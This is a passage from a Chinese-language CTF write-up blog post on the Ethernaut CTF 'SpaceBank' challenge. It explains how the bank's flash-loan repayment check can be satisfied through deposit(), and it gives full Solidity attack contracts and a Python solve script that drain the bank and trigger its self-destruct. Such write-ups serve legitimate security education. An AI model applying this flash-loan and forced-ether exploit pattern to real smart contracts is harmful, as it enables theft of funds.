+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Middle &#123;</span><br><span class="line">    Payer constant myPayer = Payer();</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        myPayer.pay(payable(msg.sender));</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Payer &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pay(address payable _bank) public &#123;</span><br><span class="line">        selfdestruct(_bank);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>警报的问题解决了，新的问题也随之浮现，即需要调用银行的<code>deposit()</code>函数才能触发警报，而我们根本没有任何一个 SpaceToken，无法直接进行 deposit 操作。没有钱嘛，就去贷款。可以看到银行合约有一个<code>flashLoan()</code>闪贷服务，主要流程就是：贷款放出后，银行会调用借贷者合约的一个特定函数，让借贷者合约拿钱去办事，而后连本带利（借款达到1000元开始收利息）归还给银行。当然，这只是正常的流程。。。在<code>flashLoan()</code>函数中是有类似于防范重入攻击的<code>entered</code>变量的，但是它只能去触发警报，而没有保护真正应该注意的地方——<code>deposit()</code>。在闪贷函数中，判断借贷者是否还款只是利用了前后的代币余额大小进行比较，而<code>deposit()</code>不仅可以增加银行的代币余额，还能增加我们在银行的存款余额。如此，我们既能掏空银行的代币，也能触发警报了。</p>
+<p>思路明确了，下面是我的攻击合约们和 Python 脚本：</p>
+<p>Solver.sol：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.9;</span><br><span class="line"></span><br><span class="line">import &quot;src/Challenge.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Solver &#123;</span><br><span class="line">    SpaceBank immutable mySpaceBank;</span><br><span class="line">    IERC20 immutable token;</span><br><span class="line"></span><br><span class="line">    constructor(address _bank) &#123;</span><br><span class="line">        mySpaceBank = SpaceBank(_bank);</span><br><span class="line">        token = mySpaceBank.token();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">    	// 借款功能，刷得余额后提款</span><br><span class="line">        mySpaceBank.flashLoan(400, address(this));</span><br><span class="line">        mySpaceBank.flashLoan(600, address(this));</span><br><span class="line">        mySpaceBank.withdraw(1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeFlashLoan(uint256 amount) external returns (bool, bytes memory) &#123;</span><br><span class="line">    	// 借款后会被银行调用，在此完成重入、绕过警报的功能</span><br><span class="line">        if (amount == 400) &#123;</span><br><span class="line">            token.approve(address(mySpaceBank), 400);</span><br><span class="line">            mySpaceBank.deposit(400, abi.encode((block.number) % 47));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            bytes memory MiddleCode = type(Middle).creationCode;</span><br><span class="line">            token.approve(address(mySpaceBank), 600);</span><br><span class="line">            mySpaceBank.deposit(600, MiddleCode);</span><br><span class="line">        &#125;</span><br><span class="line">        return (true, &quot;9527&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addBlock() external returns (uint256) &#123;</span><br><span class="line">    	// 没用的函数，为了增加区块数写的</span><br><span class="line">        if (block.number % 2 == 1) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Middle &#123;</span><br><span class="line">    Payer constant myPayer = Payer();</span><br><span class="line">    // 括号中留空，由Python脚本来填充Payer的地址，constant修饰的变量会直接放在字节码中哦</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        myPayer.pay(payable(msg.sender));</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Payer &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pay(address payable _bank) public &#123;</span><br><span class="line">        selfdestruct(_bank);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>solve.py：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">solverFile = <span class="string">&quot;challenge/project/src/Solver.sol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">payerAddr</span>):</span><br><span class="line">    <span class="comment"># 匹配并修改Solver.sol，更新Payer的地址</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(solverFile, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;=Payer\()[A-Za-z0-9]+(?=\))&quot;</span>)</span><br><span class="line">        modified_code = re.sub(pattern, payerAddr, code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(solverFile, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(modified_code)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">account, to, sig</span>):</span><br><span class="line">    receipt = account.send_transaction(to=to, data=encode_with_signature(sig))</span><br><span class="line">    <span class="keyword">return</span> receipt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>(<span class="params">conn, name, user, *args, **kwargs</span>):</span><br><span class="line">    abi, bytecode = compile_file(contract_file=solverFile, contract_names=[name], solc_version=<span class="string">&quot;0.8.21&quot;</span>, base_path=<span class="string">&quot;challenge/project&quot;</span>)[name]</span><br><span class="line"></span><br><span class="line">    c = conn.contract(signer=user, contract_name=name, abi=abi, bytecode=bytecode)</span><br><span class="line">    c.deploy(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    [rpc, pk, clg] = sys.argv[<span class="number">1</span>:]</span><br><span class="line">    <span class="comment"># rpc = rpc.replace(&quot;127.0.0.1&quot;, &quot;192.168.101.11&quot;)</span></span><br><span class="line">    <span class="comment"># 如果你经常Server Error 502，不妨试试把回环地址换成局域网地址</span></span><br><span class="line">    conn = Connection(rpc)</span><br><span class="line">    user = conn.account(pk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Challenge合约中SPACEBANK变量是immutable的，它不存在储存，而是字节码</span></span><br><span class="line">    bankAddr = conn.get_code(clg).<span class="built_in">hex</span>()[<span class="number">212</span>:<span class="number">252</span>]</span><br><span class="line">    bankAddr = conn.w3.to_checksum_address(bankAddr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SpaceBank address: &quot;</span> + bankAddr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 部署Payer合约，同时向其转账</span></span><br><span class="line">    Payer = deploy(conn, <span class="string">&quot;Payer&quot;</span>, user, value = <span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Balance of Payer: %d&quot;</span> % conn.get_balance(Payer.address))</span><br><span class="line">    modify(Payer.address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 部署Solve合约</span></span><br><span class="line">    Solver = deploy(conn, <span class="string">&quot;Solver&quot;</span>, user, bankAddr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(1st) Block number now: &quot;</span>, conn.w3.eth.get_block_number())</span><br><span class="line">    Solver.functions.attack().send_transaction()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(2nd) Block number now: &quot;</span>, conn.w3.eth.get_block_number())</span><br><span class="line">    Solver.functions.addBlock().send_transaction()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(3rd) Block number now: &quot;</span>, conn.w3.eth.get_block_number())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 调用炸银行的函数，并验证是否成功</span></span><br><span class="line">    call(user, bankAddr, <span class="string">&quot;explodeSpaceBank()&quot;</span>)</span><br><span class="line">    finish = decode_data(user.call(bankAddr, data=encode_with_signature(<span class="string">&quot;exploded()&quot;</span>)), [<span class="string">&quot;bool&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> (finish): <span class="built_in">print</span>(<span class="string">&quot;BOOOOOOM!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>逻辑全部在合约和 Python 脚本里了。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2024 Ethernaut CTF 部分Write-up</li>
+        <li><strong>Author:</strong> f4tb3e</li>
+        <li><strong>Created at
+                :</strong> 2024-03-20 06:03:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-03-20 06:03:25
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://f4tb3e.github.io/2024/03/20/2024EthernautCTF/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/solidity/">#solidity</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">浅析ERC-20</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2024 Ethernaut CTF 部分Write-up</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SpaceBank"><span class="nav-text">SpaceBank</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-text">Analysis</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Always say hello to the world!</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-regular fa-snowman-head fa-bounce" style="color: #4d8eff;"></i>&nbsp;&nbsp;<a href="/">f4tb3e</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        8 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
